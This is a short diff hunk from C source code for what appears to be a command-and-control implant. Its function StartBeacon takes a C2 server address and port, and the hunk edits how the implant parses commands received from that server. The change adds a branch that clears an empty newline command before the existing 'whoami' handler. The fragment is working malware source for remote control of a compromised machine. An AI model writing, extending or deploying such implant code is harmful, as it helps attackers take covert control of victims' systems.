@@ -176,7 +176,8 @@ void StartBeacon(char* C2Server, int C2Port)
 			// ------------------
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
-			if (strcmp(RecvData, "whoami\n") == 0) {
+			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			else if (strcmp(RecvData, "whoami\n") == 0) {
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
 				whoami(buffer); // call whoami function
 				strcat(buffer, "\n"); 
